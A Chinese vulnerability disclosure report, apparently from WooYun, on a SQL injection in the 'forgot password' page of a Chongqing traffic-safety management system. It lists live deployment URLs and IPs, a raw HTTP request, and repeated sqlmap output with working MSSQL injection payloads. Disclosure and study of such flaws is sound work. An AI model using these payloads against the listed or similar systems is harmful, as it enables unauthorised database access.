wybug_title: 重庆川顺某系统通用型sql注入
wybug_corp: 重庆川顺科技有限公司
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-03-16：	细节已通知厂商并且等待厂商处理中									2015-03-20：	厂商已经确认，细节仅向厂商公开									2015-03-23：	细节向第三方安全合作伙伴开放									2015-05-14：	细节向核心白帽子及相关领域专家公开									2015-05-24：	细节向普通白帽子公开									2015-06-03：	细节向实习白帽子公开									2015-06-18：	细节向公众公开  简要描述： rt 详细说明：  部分案例：http://sz.cqkyaq.com:122/default.asp石柱重点车辆和驾驶人安全管理系统http://www.ncdlaq.com:188/default.asp重庆市农村道路交通安全信息系统http://112.124.10.78:132/default.asp四分所驾驶培训监督管理系统http://42.121.90.111:132/default.asp重庆市重点车辆和驾驶人安全管理系统“忘记密码”处存在get注入。。
POST /too1/GetPWD.asp?user=admin HTTP/1.1Host: sz.cqkyaq.com:122Proxy-Connection: keep-aliveContent-Length: 17Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://sz.cqkyaq.com:122User-Agent: Opera/9.80 (Macintosh; Intel Mac OS X; U; en) Presto/2.2.15 Version/10.00Content-Type: application/x-www-form-urlencodedReferer: http://sz.cqkyaq.com:122/too1/getpwd.asp?user=adminAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: RSQNJNRNSOBBFYQFCXCX=VBDFWSYBCWGEVQDBBMOICNILONSMUWCYETKEGYTP; carname=adminact=tj&answer=asd
   漏洞证明：  


sqlmap identified the following injection points with a total of 1183 HTTP(s) requests:---Parameter: user (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: user=admin' AND 6955=6955 AND 'iUGP'='iUGP    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: user=admin' AND 1708=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(112)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (1708=1708) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(120)+CHAR(122)+CHAR(122)+CHAR(113))) AND 'hLbh'='hLbh    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: user=admin';WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind (comment)    Payload: user=admin' WAITFOR DELAY '0:0:5'-----back-end DBMS: Microsoft SQL Server 2000sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: user (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: user=admin' AND 6955=6955 AND 'iUGP'='iUGP    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: user=admin' AND 1708=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(112)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (1708=1708) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(120)+CHAR(122)+CHAR(122)+CHAR(113))) AND 'hLbh'='hLbh    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: user=admin';WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind (comment)    Payload: user=admin' WAITFOR DELAY '0:0:5'-----back-end DBMS: Microsoft SQL Server 2000sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: user (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: user=admin' AND 6955=6955 AND 'iUGP'='iUGP    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: user=admin' AND 1708=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(112)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (1708=1708) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(120)+CHAR(122)+CHAR(122)+CHAR(113))) AND 'hLbh'='hLbh    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: user=admin';WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind (comment)    Payload: user=admin' WAITFOR DELAY '0:0:5'-----back-end DBMS: Microsoft SQL Server 2000current database:    'CarSZNew'

wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-03-20 16:09 厂商回复： CNVD确认所述情况，已经转由CNCERT下发给重庆分中心，由其后续协调网站管理单位处置。 最新状态： 暂无
